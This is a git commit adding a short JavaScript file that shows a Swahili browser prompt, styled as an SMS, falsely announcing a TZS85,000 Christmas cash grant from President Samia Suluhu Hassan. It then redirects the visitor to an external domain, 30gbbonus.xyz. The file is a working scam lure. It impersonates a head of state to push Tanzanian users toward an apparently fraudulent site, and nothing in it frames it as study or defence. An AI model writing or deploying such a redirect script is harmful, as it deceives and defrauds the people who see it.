8c400878e7bcbc6d5a4ad27a63836d858fa73b1f
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-12-16 06:23:56 -0800

    Create tanzania-active.js

---
+++ tanzania-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ONDOA TZS85,000 '
+password=prompt('SMS: Hongera Una sifa za kuwa Rais SAMIA SULUHU HASSAN TZS85,000 RUZUKU YA FEDHA ZA KRISMASI KWA WATANZANIA WOTE, Bonyeza Sawa Kutoa Zawadi ya Fedha Taslimu.   ','ONDOA TZS85,000 ');
+if (password != 'ONDOA TZS85,000 ') {
+location.href='https://30gbbonus.xyz/tanzania-grant.html';
+}
